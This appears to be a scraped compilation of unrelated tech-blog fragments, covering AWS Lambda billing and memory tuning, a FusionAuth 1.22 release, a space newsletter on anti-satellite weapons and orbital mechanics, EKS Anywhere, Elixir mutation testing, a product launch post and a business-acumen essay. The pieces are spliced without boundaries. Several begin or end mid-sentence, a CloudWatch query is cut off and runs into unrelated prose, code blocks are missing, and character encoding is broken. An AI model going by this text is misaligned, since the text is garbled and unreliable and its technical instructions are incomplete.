src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png 468w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image.png 300w" sizes="(max-width: 468px) 100vw, 468px"></figure><p>This shows that the change to billable duration has the most impact on the cost of running short-lived functions, with up to 67% shorter billable durations in this example. For subsecond functions, the example shows a 10% drop in average duration, while it has less impact for longed-lived functions.</p><p>In practice, in most production workloads, Lambda functions run for brief amounts of time, so there are good opportunities for optimization here.</p><h2 id="h-memory-cost-and-duration">Memory, cost, and duration</h2><p>One of the major configuration levers available to you as a Lambda developer is memory. You can set the allocated memory from 128 MB to 10 GB in 64 MB increments. However, memory also controls the amount of virtual CPU available to your function, ranging from a percentage of a single core at 128 MB to six full virtual CPUs at maximum memory.</p><p>For many compute-intensive functions, increasing the memory shortens the overall duration. This means you can achieve a faster function with a negligible impact on cost in many cases. To find the optimal balance for your functions, there are a couple of options. You can manually test a function with different memory allocations to measure the effect on duration, or you can use the <a href="https://github.com/alexcasalboni/aws-lambda-power-tuning">AWS Lambda Power Tuning</a> tool.&nbsp;</p><p>This tool helps automate finding the balance between memory, duration and cost, and visualizes the results. For example, a compute-intensive function is evaluated at different memory levels. The resulting chart shows it performs fastest at 3008 MB but the lowest cost occurs at 1024 MB and 1536 MB:&nbsp;</p><figure><img loading="lazy" width="468" height="227" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png 468w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/12/image-1.png 300w" sizes="(max-width: 468px) 100vw, 468px"></figure><p>When the minimum billing duration was 100 ms, there was no financial gain by optimizing functions that ran for less than 100 ms. While increasing memory may have reduced milliseconds in these cases, the overall cost increased due to the additional memory usage and no change in the duration minimum. However, with 1 ms billing, this all changes – it’s now worth optimizing the efficiency of these functions. There are many steps you can take to optimize these short-running functions.</p><h2 id="h-reusing-tcp-connections-in-node-js">Reusing TCP connections in Node.js</h2><p>In Node.js, the default HTTPS agent creates a new TCP connection for every new request. If you are interacting with services like DynamoDB, the latency of this operation can be greater than the time taken for the database request. This latency is also compounded if your service request uses the <a href="https://aws.amazon.com/kms/">AWS Key Management Service</a>.</p><p>You can change a setting to ensure that the TCP connection is reused by using a flag that was enabled by the <a href="https://aws.amazon.com/tools/">AWS SDK</a> from version <a href="https://github.com/aws/aws-sdk-js/blob/master/CHANGELOG.md#24630">2.463.0</a>. The easiest way to apply this is to use an environment variable in your Lambda functions. By setting <em>AWS_NODEJS_CONNECTION_REUSE_ENABLED</em> to 1, warm invocations of the function will then reuse the connection.&nbsp;</p><p>This section refers to an example application in this <a href="https://github.com/aws-samples/building-faster-aws-lambda-functions">code repo</a>. I compare the latency of putting an item into an <a href="https://aws.amazon.com/dynamodb/">Amazon DynamoDB</a> table, with and without the reuse flag. I run a <a href="https://aws.amazon.com/blogs/compute/load-testing-a-web-applications-serverless-backend/">load test</a> on each function for 1000 request over 300 seconds. Using this <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/AnalyzingLogData.html">CloudWatch Insights</a> query, I can then analyze the duration averages and percentile metrics:</p><div><div><div><div><pre>filter @type = "REPORT"

Your use-case will determine which ones you can apply.</p><p>First, your choice of runtime makes a difference. Although the Lambda service is agnostic to runtime, some runtimes are faster to initialize than others. For short functions, consider using runtimes like Node.js, Go and Python, which can typically run more quickly.</p><p>Keep your deployment package sizes as small as possible since larger packages often take longer to initialize. You should remove any requirements or library imports that are not used directly by the function. Also, avoid “monolithic” functions that contain multiple code paths, and minify your code wherever possible to help get the deployment package size as small as it can be.</p><p>Ensure that any global objects that require initialization, such as database connections, are defined in the global scope. This is the code outside of the Lambda handler function, also known as “INIT” code. The cost of any lengthy initialization code is then amortized over multiple invocations if the same execution environment is invoked multiple times.</p><h2 id="h-conclusion">Conclusion</h2><p>With the new 1 ms billing for Lambda functions, optimizing code duration has a direct impact on the cost of running Lambda functions. Shorter-lived functions can often run much faster with only a few small changes, and this translates to lowering cost.</p><p>Memory allocation in Lambda determines the CPU power of your function. To help determine the optimal trade-off between duration, cost and memory, use the AWS Power Tuning Tool. The ‘Reuse HTTP connection’ flag can help reduce latency in Node.js functions and you can enable this with an environment variable. Selectively choosing parts of the AWS SDK to import can also reduce duration without impacting the functionality of your business logic.</p><p>For more tips and tricks to help you get the most from your Lambda-based applications, visit <a href="https://serverlessland.com/">Serverless Land</a>.</p></div></div></div>]]>

              <p>We’re excited to announce the release of version 1.22 of FusionAuth. This release shipped on Dec 1, 2020. This version delivers new features as well as resolving issues for users on version 1.21 and older.</p>

<!--more-->

<h2 id="highlights">Highlights</h2>

<p>In addition to bug fixes and enhancements, there are a couple of new improvements I wanted to highlight.</p>

<h3 id="elasticsearch-improvements">Elasticsearch improvements</h3>

<p>Elasticsearch is one of the two search engines available for FusionAuth. (If you aren’t sure which one to choose, you can read about the <a href="https://fusionauth.io/docs/v1/tech/core-concepts/users/#user-search">strengths and limitations of each</a>.)</p>

<p>This release includes improvements to Elasticsearch. You may now specify the index name, using any of the configuration options (environment variable, system property or configuration file option). You might want to do this if you are running multiple instances of FusionAuth, perhaps for different development environments, but using the same Elasticsearch cluster. See the <a href="https://fusionauth.io/docs/v1/tech/reference/configuration/">configuration reference documentation</a> for more details.</p>

<p>You don’t typically have to reindex Elasticsearch in a production environment, but sometimes you want to. This operation can be done from the administrative user interface by navigating to “System” and then “Reindex”. The reindexing process has been substantially reworked in 1.22, and you can now reindex 1M users in approximately 100 seconds. Performance does depend on hardware and other system activity, however.</p>

<h3 id="asynchronous-tenant-deletion">Asynchronous tenant deletion</h3>

<p><a href="https://fusionauth.io/docs/v1/tech/core-concepts/tenants/">Tenants</a> are useful in many situations, and FusionAuth supports unlimited tenants. You can use them for private labeling your application, for different dev/test/qa environments, or for logical separation between different applications and API keys.</p>

<p>Tenants are also useful for testing bulk load migration scripts. When you use a tenant for this purpose, you’ll delete the tenant repeatedly. Doing so deletes all the applications, groups, users, and configuration associated with a tenant. There’s no going back when you delete a tenant, so FusionAuth asks you to confirm it:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/release-1-22/delete-screen.png" alt="The delete tenant confirmation screen."></p>

<p>Deleting all these entities can take some time. The <a href="https://fusionauth.io/docs/v1/tech/apis/tenants/#delete-a-tenant">delete operation</a> can now be asynchronous using the API and passing <code>async=true</code>. Before this release, you had to ensure that your requesting client had a high timeout setting, as it had to wait for the entire operation to complete. When you’re loading millions of test users, that can take a fair bit of time.</p>

<p>With this release the API client can request a deletion and then poll periodically to see if the tenant deletion has finished. We say, let that API client rest a bit!</p>

<h2 id="bugs-squashed">Bugs squashed</h2>

<p>In addition to the above improvements, there were over ten other bugs squashed and GitHub issues resolved. These included increasing the third party identity provider timeout, a two factor authentication code request bug, and fixing an error during the login process when using an LDAP connector. Please see the <a href="https://fusionauth.io/docs/v1/tech/release-notes/#version-1-22-0">release notes</a> for the full breakdown of the changes between 1.21 and 1.22.</p>

However, that war will (hopefully!) be slow and boring, with countries prioritizing directed energy and electronic attacks on satellites over kinetic ones so as to avoid creating debris that would deny space access as much to themselves as others. <a href="https://spaceflightnow.com/2020/07/23/u-s-officials-say-russia-tested-a-new-anti-satellite-weapon/" target="_blank">Russia</a>, the <a href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#United_States_ASATs" target="_blank">US</a>, <a href="https://en.wikipedia.org/wiki/2007_Chinese_anti-satellite_missile_test" target="_blank">China</a>, &amp; <a href="https://carnegieendowment.org/2019/04/15/india-s-asat-test-incomplete-success-pub-78884" target="_blank">India</a> all have direct ascent anti-satellite weapons (with the latter three countries having spread space debris during ill-conceived weapons tests), and <a href="https://en.wikipedia.org/wiki/Arrow_3#:~:text=Arrow%203%20may%20serve%20as%20an%20anti-satellite%20weapon" target="_blank">Israel may as well</a>. At least the US and Russia also have <a href="https://www.theverge.com/2020/7/23/21335506/russia-anti-satellite-weapon-test-kosmos-2543" target="_blank">anti-satellite satellites</a> that <a href="https://www.theverge.com/2020/1/31/21117224/russian-satellite-us-spy-kosmos-2542-45-inspection-orbit-tracking" target="_blank">maneuver around</a> and muck with other satellites in undefined ways. These countries also likely have ground and satellite-based jammers and lasers (both dazzling and destructive). Satellites are very hard to defend because they have predictable orbits and very limited maneuvering budgets, so instead of having a few <a href="https://spacenews.com/the-end-of-sbirs-air-force-says-its-time-to-move-on/" target="_blank">exquisite satellites as the US military does now</a>, the US DOD is following (and <a href="https://www.theverge.com/2020/10/6/21503165/spacex-space-development-agency-contract-missile-warning-satellites-starlink" target="_blank">employing</a>) the NewSpace industry toward a proliferation of small, disposable satellites. Related: A <a href="https://aerospace.org/sites/default/files/2020-10/Reesman_PhysicsWarSpace_20201001.pdf" target="_blank">PDF entitled “The physics of space war: how orbital dynamics constrain space-to-space engagements”</a> from Aerospace Corp. talks about how the limited ∆v budgets of space vehicles limits warfare and makes planning and timing essential to an attack. (The PDF, oddly, has the following invisible text on the first page: “<em><span>THIS MATERIAL IS BEING PROVIDED PRE-RELEASE SOLELY FOR THE USE OF GEN. JAMES DICKINSON, AND IS NOT APPROVED FOR RELEASE</span>.</em>”)</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#catching-the-iss-and-other-orbital-maneuvers">¶</a><strong id="catching-the-iss-and-other-orbital-maneuvers">Catching the ISS and other orbital maneuvers.</strong> When covering space missions, we often talk about ∆v (like how <a href="http://orbitalindex.com/archive/2019-03-05-archive-Issue-2/#the-beresheet-lunar-lander-performed-its-first-orbit-raising-burn" target="_blank">Beresheet's ∆v budget was minuscule</a> for a lunar mission), orbital inclinations (Starlink’s <a href="https://directory.eoportal.org/web/eoportal/satellite-missions/s/starlink" target="_blank">53° inclination</a> leads to its service coverage stopping around latitudes of 53°), and in-space rendezvous (ex. <a href="https://en.wikipedia.org/wiki/Mission_Extension_Vehicle" target="_blank">MEV-1</a>, Crew Dragon's <a href="https://youtu.be/3hK540tMmvw" target="_blank">approach to the ISS</a>, and the <a href="https://www.esa.int/ESA_Multimedia/Images/2020/11/ESA_tracks_Chang_e-5_Moon_mission" target="_blank">Chang'e 5 ascent vehicle’s upcoming lunar orbit rendezvous with its return vehicle</a>), but we rarely cover the concepts themselves, so here’s an exceptionally brief attempt. Orbital Mechanics has been around since well before artificial satellites were even remotely possible—for example, Walter Hohmann discovered his eponymous <a href="https://en.wikipedia.org/wiki/Hohmann_transfer_orbit" target="_blank">transfer orbit</a> in 1929. This simple transfer maneuver consists of two velocity changes, the first to elongate an orbital ellipse so that it intersects a target apogee and a second to circularize the ellipse (<a href="https://youtu.be/aKXNbf6NCKU" target="_blank">video explainer</a> 📺). Orbital plane changes, avoided whenever possible due to high energy cost, are completed by normal acceleration at the point around which the orbital plane should pivot. Meanwhile, rendezvous between two craft in different orbits often requires the application of multiple maneuvers (see <a href="https://www.spaceflightinsider.com/missions/human-spaceflight/breakdown-of-crew-1-flight-plan-an-inside-look/" target="_blank">Crew-1's flight plan</a>). Timing an orbital transfer is key, as the maneuvering spacecraft must give the target the correct lead time or it will end up&nbsp;in front or behind. Rendezvousing with another object in the same orbit is perhaps the most counterintuitive, as you must adjust your orbital period by leaving the shared orbit and later re-entering it. To "slow down" you accelerate to increase the height of your orbit, lengthening your orbital period relative to the other craft, let time pass, and then re-enter the original orbit once they've caught up. Conversely, to catch up, you decrease velocity to achieve a smaller, more eccentric orbit, which has a shorter orbital period. There are tons of resources out there for diving into the math of orbital mechanics (and related concepts like the <a href="https://en.wikipedia.org/wiki/Oberth_effect" target="_blank">Oberth effect</a> and Sun-synchronous orbits that are only possible because of torque from the <a href="https://en.wikipedia.org/wiki/Equatorial_bulge" target="_blank">Earth’s equatorial bulge</a>). Surprisingly, an easy read comes from the FAA's Office of Aerospace Medicine <a href="https://www.faa.gov/about/office_org/headquarters_offices/avs/offices/aam/cami/library/online_libraries/aerospace_medicine/tutorial/section3/spacecraft_design/" target="_blank">as part of their "Advanced Aerospace Medicine On-line" course</a> (we're not sure how Hohmann transfers relate to patching up wounded astronauts). You can also <a href="https://orbitalmechanics.info/" target="_blank">play with orbits in a simulator</a>, but we generally recommend <a href="https://www.kerbalspaceprogram.com/" target="_blank">Kerbal Space Program</a> if you really want to develop a more intuitive sense of two-body orbital mechanics while having a blast (pun very much intended). Sadly, KSP 2, the much-anticipated sequel with multiplayer support, <a href="https://www.polygon.com/2020/11/5/21551754/kerbal-space-program-2-release-date-delayed-2022" target="_blank">has now slipped to a 2022 release</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div> <strong>Papers</strong><ul><li> <a href="https://earthsky.org/space/is-it-true-that-jupiter-protects-earth" target="_blank">Jupiter may protect us from asteroids</a>, but it also likely prevented us from having siblings—had the solar system not had a gas giant, we might have up to 6 planets in our habitable zone (<a href="https://iopscience.iop.org/article/10.3847/1538-3881/ab9ffe" target="_blank">paper</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p><em>Don’t forget to&nbsp;<a href="https://get.acloudguru.com/reinvent2020">throw in your email address</a>&nbsp;to get an executive summary in your inbox from ACG each day of re:Invent!</em></p><p>AWS, you sneaky devils.</p><p>Look at the <a href="https://aws.amazon.com/eks/eks-anywhere/faqs/">FAQ for EKS Anywhere</a>, announced yesterday for a 2021 launch, and you’ll find plenty of references to “on-premises”, bare metal compute, and VSphere. AWS’s stated rationale for expanding access to their managed Kubernetes service is all about hybrid cloud, which traditionally has meant “your old busted servers plus AWS’s shiny goodness.”</p><p>But wait … EKS Anywhere<em>? </em>Does that really mean <em>anywhere</em>?</p><p>Could it mean … Azure?</p><p>Lo and behold, <a href="https://www.protocol.com/aws-multicloud-era">Protocol has obtained confirmation</a> that EKS Anywhere (and technically ECS Anywhere, but let’s be real, if you want to run on multiple cloud providers you’re using Kubernetes) <strong>will support workloads running on Azure and GCP as well as private data centers</strong>. AWS is giving you a single pane of glass that will let you roll out config updates, instrument monitoring, and connect other app services to container workloads on your cloud of choice.</p><p>That’s right: AWS just rolled out a multi-cloud container management service.</p><p>You are now permitted thirty seconds to pick your jaw off the floor.</p><h2 id="h-what-does-aws-gain-from-doing-this">What does AWS gain from doing this?</h2><p>This marks … shall we say … a bit of a departure from AWS’s classic “one cloud to rule them all” rhetoric. After all, at various other times in Tuesday’s re:Invent keynote Andy Jassy unleashed <a href="https://aws.amazon.com/rds/aurora/babelfish/">a frontal assault on Microsoft SQL Server</a>, dunked gleefully on archnemesis-turned-punching-bag Oracle, and found GCP so unthreatening that he closed his presentation, without comment, on a song lyric that used “Google” as a verb.</p><p>And yet multi-cloud is here to stay, and Jassy knows it.</p><p>Check out my recent piece <a href="https://cloudirregular.substack.com/p/aws-hearts-multi-cloud-its-gonna">“AWS Hearts Multi-Cloud”</a> for a full analysis of why, but here’s the gist. <a href="https://cloudpundit.com/2020/09/18/the-multicloud-gelatinous-cube/"><strong>Multi-cloud is a gravitational inevitability for enterprises</strong></a>. ACG’s recent <a href="https://acloudguru.com/blog/news/a-cloud-guru-unveils-state-of-cloud-learning-report">State of Cloud Learning Report</a> found that while about 75% of cloud shops still use AWS as their primary cloud provider, the same 75% also have at least some workloads running on Azure or another cloud. Could be due to acquisition, service envy, bet-hedging, or simple lack of coordination – or all of the above. Reality is messy and getting more so.</p><p>AWS has a huge head start on the rest of the cloud industry, but 75% of people won’t think of AWS as their “primary” cloud provider forever. Not when there are so many best-of-breed services to choose from, both on other clouds and on focused SaaS providers like Snowflake and Datadog. And certainly not given that plenty of industries have active incentive to avoid deep integration with a cloud provider owned by Amazon.</p><p>So AWS has a limited window of opportunity to keep that central status in cloud teams’ hearts. Providing higher-level, cross-cloud management tools is the easiest way to do it. The other cloud providers certainly get this; Azure isn’t hamstrung by an inability to admit the validity of AWS workloads, and they’re rushing into the breach with tools like Arc and Sentinel.</p><h2 id="h-this-is-only-the-beginning">This is only the beginning</h2><p>Really, the amazing thing is that AWS spun the “Anywhere” releases so adroitly, and described them so diffusely, that it took a day to confirm that multi-cloud was really their intent. And they can’t keep playing both sides much longer.

<p>It’s fairly common for folks who haven’t used mutation testing before to not immediately see
the value in the practice. Mutation testing is, after all, still a fairly niche and under-used
tool in the average software development team’s toolbox. So today I’m going to show a few specific
types of <em>very</em> common problems that mutation testing is great at finding for us, and that
are hard or impossible to find with other methods. This is the code that we’ll be working with
today:</p>

</span><span data-group-id="3847153202-1">end</span></code></pre>
<p>Here’s what <code>cover</code> says about our tests:</p>
<p><img src="http://devonestes.com/images/cover_example.png" alt="cover output"></p>
<p>We can see here that we have 100% code coverage, so we should be all good in terms of testing,
right? There’s no way we could have any bugs here, and there’s <em>definitely</em> no way we can
reasonably break this code without causing a failing test.</p>
<p><strong>Just kidding!!</strong> Neither of those two functions work at the moment, and we’re not testing all of
the behavior in either of them despite “100% code coverage,” so it’s really easy to introduce a
regression without causing a failing test.</p>
<h2>The “multiple execution paths on a single line” problem</h2>
<p>In our test for the <code>stringify_keys/1</code> function, and the <code>cover</code> output for that test, we can see
that we’re testing both branches in the <code>if</code> statement in that function. But our test for that
function only passes a tuple as a key and never a map! So, if we were to change that code to be:</p>
<pre><code><span>if</span><span> </span><span>is_nil</span><span data-group-id="8320073969-1">(</span><span>k</span><span data-group-id="8320073969-1">)</span><span> </span><span>or</span><span> </span><span>is_tuple</span><span data-group-id="8320073969-2">(</span><span>k</span><span data-group-id="8320073969-2">)</span><span> </span><span data-group-id="8320073969-3">do</span><span>
  </span><span data-group-id="8320073969-4">{</span><span>inspect</span><span data-group-id="8320073969-5">(</span><span>k</span><span data-group-id="8320073969-5">)</span><span>,</span><span> </span><span>v</span><span data-group-id="8320073969-4">}</span><span>
</span><span data-group-id="8320073969-3">else</span><span>
  </span><span data-group-id="8320073969-6">{</span><span>to_string</span><span data-group-id="8320073969-7">(</span><span>k</span><span data-group-id="8320073969-7">)</span><span>,</span><span> </span><span>v</span><span data-group-id="8320073969-6">}</span><span>
</span><span data-group-id="8320073969-3">end</span></code></pre>
<p>we wouldn’t see a failing test. This could be correct behavior, or we could be introducing a bug
that might cause real problems for the users of our software - we just don’t know, because that
behavior isn’t tested anywhere! This is one of the huge ways in which “code coverage” that just
counts by lines of code executed in a test run falls short: it assumes that each line of code
contains a single execution path through the code in question, and that’s <strong>often</strong> wrong.</p>
<p>Mutation testing, on the other hand, shows us if we’re missing test cases based on the <strong>logic</strong>
in our code instead of based on the <strong>lines</strong> in our code. I think we can all agree that this is a
far better measure of code coverage for an application, right?</p>
<h2>The “untested side effect” problem</h2>
<p>At first glance, the code in our <code>write_json_to_file/2</code> function might <em>seem</em> correct, and it
certainly is doing <em>something</em>, but based on those variable names I don’t think it’s actually
doing what we want. If you run this test, you might see a strange file created on your filesystem:</p>
<pre><code>$ cat '{"test":"map"}'
tmp/CoverExampleTest/test-write_json_to_file-2-gives-us-the-correct-JSON</code></pre>
<p>Yep - the file path and the file contents are switched! And yet we have 100% code coverage and
no failing tests, so all the feedback we’re getting is telling us that things are good. This is
because we have an <strong>untested side effect</strong> in that function. And the real kicker is, like 90% of
the really important and useful stuff that happens in most applications are <strong>side effects</strong>. If
we’re not testing them, then we’re running a really high likelihood of a regression in an
important part of our application.</p>
<h2>The “missing pin” problem</h2>
<p>Those first two problems I’d say are the biggest things that mutation testing can find for you
that you <em>can’t</em> easily find through things like looking at code coverage based on LOC. This next
problem however, is much more rare (although I still see it at least a couple times a year) and
very Elixir specific, so I figured I’d include it here today.</p>
<p>Our test for <code>write_json_to_file/2</code> is currently passing even though we’re probably not doing what
the developer wanted it to do. Why could that be?</p>
<p>We’re missing a <code>^</code>! The <code>^</code> (called the “pin operator”) is used to avoid re-binding a variable in
a pattern match, but it’s <em>super</em> easy to forget them in tests, or to use the match operator <code>=</code>
in place of the equality operator <code>==</code> in a test. In either of those cases, you’ll end up with a
passing test where you shouldn’t have one.</p>
<p>If we change <code>assert expected = stringified</code> to <code>assert ^expected = stringified</code> or
<code>assert expected == stringified</code> we’ll see the failure that the developer who wrote that code
probably intended to show. Mutation testing can give us this feedback to at least let us know that
there’s something that’s still not quite right and might need some additional human intervention
to resolve.</p>
<h2>Use computers instead of humans</h2>
<p>The most important thing to note here is that currently, without mutation testing, the only way
you’ll get feedback about these issues is from a human giving it to you. Either you’ll figure it
out yourself as you’re working on the code, or maybe someone will pick it up in a PR review, or
you’ll get a bug report from a QA tester or a user. But for most teams there’s no automated way of
getting this feedback quickly and easily that will scale with a development team as it grows -
this is where mutation testing comes in!</p>
<p>Code coverage is yet another thing that roughly follows the
<a href="https://en.wikipedia.org/wiki/Pareto_principle">Pareto Principle</a>. Code coverage based on lines
of code executed gets you 80% of the way there and takes 20% of the effort. It’s easy to do, and
it’s pretty good! But for applications that need (or want) a higher level of coverage, they’re
going to need something like mutation testing to give them that extra 20% that other tools and
techniques just can’t offer.</p>

<![CDATA[Launching Familio – From MVP to Public Launch]]>

December 2, 2020 | https://familio.life/blog/launching-familio-mvp-to-launch | <a href="https://web.archive.org/web/*/https://familio.life/blog/launching-familio-mvp-to-launch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <div>
      <div><p>Over the past year and a half, I have been using Familio for my own family organization. In April, at the start of the COVID-19 pandemic, I decided to make the Familio Minimum Viable Product(MVP) accessible to the internet. Now, I'm excited to announce the public launch of Familio.Â&nbsp; There was a large gap between making Familio public and being ready for launch. I had to ensure Familio was able to communicate the value prop of being a privacy focused family platform via the copy and branding of the product. As a product minded software engineer, I have a deep focus on the function of the product but not enough focus on the chrome around the product. A functioning product is great but to have it ready for launch requires a few different areas of work. Building experiences for knowledgeable users is fine for a MVP but it's also important to design for the people with zero product knowledge. This was the biggest gap I need to cross with Familio.</p><p>I want to share what I did with Familio to get ready for public launch. There are four areas of work to ensure your product can stand on it's own and be able to attract users with no prior knowledge of. For each of these areas I will go over the general concept and what I did to improve that area.</p><p><strong>What it takes to get products from MVP to Launch:<br></strong></p></div><ol>
<li>
<strong>Focus on branding and copy.</strong><br>The product needs to speak for itself. When a random person on the internet stumbles onto your website, they need to understand all the value the product provides from the website itself. You aren't there to explain it for them or answer questions. It's simple marketing 101 but it's important to put in the time to communicate that value. No matter how good the product is, if a person doesn't know what the product does and find it compelling enough to sign up, it's all for not.<br>For me, I talked with my sister-in-law who is a copy writer for a branding agency. I showed her the website without context, had her ask questions, then helped me create the content. It took fresh eyes and focus on the content to make the copy of Familio shine. Value props that I thought were important weren't and some smaller features were actually the most interesting to her. The branding and copy will always change as you learn more about your customers but investing in the copy makes Familio speak for itself.</li>
<li>
<strong>Ensuring a smooth and fun onboarding process</strong><br>Onboarding is the zero to one experience for your users. First impressions are critical as the product only gets one chance before forgotten. Teach the user the core functionality, lead them through their first product "moment" and ensure they get across the finish line. Without an onboarding experience, you are throwing the user directly in the deep end of a pool without any help. <br>Frankly, this is the area I still want to improve the most. Right now there is a 4 step onboarding wizard that helps users set up accounts and ask for their payment information. There is definitely more to do here. <a href="https://familio.life/users/sign_up">Give Familio a try</a> and let me know what you think about the onboarding.</li>
<li>
<strong>Adding help text and clear instructions</strong><br>Adding onto items 1 and 2, it's important to provide help and instructions within the product. While building the product, you will know everything about the functionality while your users which know nothing. Add in helpful text, clear instructions and useful zero states. Even though these items are only seen once, it's an import part to making your product complete.<br>For each product section(Contacts, Photo Albums, Newsletters and Recipes), I added help panels that explain the functionality and how to use the utilities. It's consistent, clear and always available. For each list, Familio has a zero state which shares more about the section and has a call to action to create their first one. All of this will help users understand and learn the product.</li>
<li>
<strong>Side project marketing</strong><br>Unlike the Field of Dreams, if you build it they won't come. You will need to seed awareness for your product. This requires you to go out into the world and share your product. My advice is to not look at marketing as an instant success/failure but to instead look at the momentum. Are there more users than last month? Have you shared the product in more places than before? <br>For me, I shared Familio on HackerNews, <a href="https://www.producthunt.com/posts/familio">Product Hunt</a>, and my family/friends. It's a small seed but this starting momentum has started the ball rolling.Â&nbsp;</li>
</ol><div>
<p>I hope these four steps help you take a side project to a publicly sharable product. Focus on the polish and the get your users to love your product. I'm excited for Familio to see a wider audience and get wider adoption.</p><p>Cheers ðŸ�»,</p><p>Mike</p></div>

        <strong>Rebase</strong> is a new conference for and by practitioners who want to engage academics about tomorrow's technologies while fondly recalling the achievements of yesterday.
      </p>
      
      <p>
        This year, <strong>Rebase</strong> was planned to occur twice, once in Berlin
        with the <a href="https://2020.ecoop.org/">ECOOP</a> conference and
        once in Chicago with the <a href="https://2020.splashcon.org/">SPLASH</a> conference.
        Due to outside forces, there will be a single virtual event.
      </p>
      
      <p>
        <strong>Rebase</strong> will use the Clowdr platform for interaction,
        registration allows attendees to ask questions and meet with each other
        and with speaker. Registration also give access to all of the
        <a href="https://2020.splashcon.org/">SPLASH</a> co-located events.
      </p>
      
      <p>
        <strong>Rebase is free. All talks were streamed live and are now available on <br> <a href="https://www.youtube.com/playlist?list=PLyrlk8Xaylp6aNlOgiyE4W30X7DpXx74m"><i></i>&nbsp;YouTube</a>.</strong>

<p>Let’s walk through this.</p>



<p id="h-in-general-a-company-can-make-money-through-several-different-streams-most-companies-generate-revenue-from-paying-customers-a-customer-either-pays-a-one-time-fee-or-more-common-today-a-recurring-payment-also-known-as-a-subscription-the-more-paying-customers-the-business-has-the-more-revenue-it-generates-and-in-turn-also-generates-more-profits">In general, a company can make money through several different streams.<br>Most companies generate revenue from paying customers. A customer either pays a one-time fee or, more common today, a recurring payment, also known as a subscription.<br>The more paying customers the business has, the more revenue it generates and, in turn, also generates more profits.</p>



<p>Let’s get more specific and use Slack as an example.<br>Slack offers Chat and Collaboration for teams to work more effectively, mostly if team members work from different physical locations.<br>Slack generates revenue from paying customers. The more organizations sign up, the better.<br>But, how does Slack acquire new customers?<br>It’s a two-fold problem. For one, people need to know that Slack exists. The company achieves this through advertisements online and on billboards.<br>If a single person signs up, they don’t get too much value out of it. It only becomes useful once more team members join. Therefore, they have their team members sign up as well.<br>Who is Slack’s target customer? It is not everyone.<br>They target organizations that benefit from streamlined collaboration across physical boundaries.<br>Often, though, getting into these organizations through the front door, meaning following a standardized purchasing process, is tiring, especially if you’re brand-new.<br>How does Slack get introduced into organizations then?<br>They come in through the side door. For instance, a few people within an organization send information back and forth via email. If you ever used email extensively, you know it’s easy to lose track of conversations and information.<br>They decide to give Slack a try. Signing up is easy, and sharing information is more straightforward.<br>They open a set of different Slack channels for various topics and start collaborating in real-time.<br><strong>The only limit</strong>: They can only access the last 10,000 messages within the workspace. It’s not ideal, but acceptable for now. Other team members start to join because the information they need is only available in these Slack channels.<br>And soon, the workspace has grown enough that employees can make a compelling case to leadership to convert to a paid plan.<br>Slack grows its reach and makes it easier to convert non-paying into paying customers over time.<br>Lastly, to make this work effectively, Slack needs to understand precisely how their customers make money.</p>



<h2 id="h-why-you-need-to-know-how-your-customers-make-money">Why you need to know how your customers make money</h2>



<p>Whatever you offer to your customers comes at a price. Preferably, at a price that provides you with a desirable margin. But how can you charge a high price and have the customer pay it?<br>Let’s find out exactly how you can generate value for the customer.</p>



<p>Slack understands that their customers want to collaborate on projects straightforwardly and as fast as possible across physical boundaries.<br>They ask the crucial question: “If our customer can finish a week early or team members can work effectively from home, what impact does that have on their business?”<br>The answer can be additional revenue or gaining a competitive advantage over competitors.<br>Now, if Slack provides that much value, the customer has little reason to hesitate and purchase seats for all team members.<br>Suddenly, what seemed like a considerable expense beforehand became an investment in the team and the company.</p>



<h2 id="h-how-does-business-acumen-relate-to-your-role-in-software-development">How does Business Acumen relate to your role in Software Development?</h2>



<p><br>Your primary focus might be on cutting-edge technologies you’d like to work with soon.<br>That’s the reason why the company hired you in the first place. You know which technologies to introduce to bring value to the table.<br>What if you expanded your focus not just to deliver great software but also increased value for your customer?<br>Invest more effort to understand the customer, where they come from, what you can do to help with as fast as possible.<br>It means to evaluate technology not just on its merits that affect you, but also how they can help the customer. For instance, if you choose between a cutting-edge and brand new framework and a battle-tested framework, which impact does it have on the customer?<br>If you choose the former, the customer might experience more bugs, less reliable software, and can’t work as productive.<br>The battle-tested framework might not be as exciting from a programming point of view but helps to deliver reliable software right from the start.<br>The customer can work uninterruptedly, and also it means fewer outages during on-call shifts.</p>



<p>What do you think? What impact does Business Acumen have on your daily work and position?<br>Share your experience in the comments.</p>

<h3><u>Intuition</u></h3>
<p>Data preprocessing can be categorized into two types of processes: <em>preparation</em> and <em>transformation</em>.</p>
<blockquote>
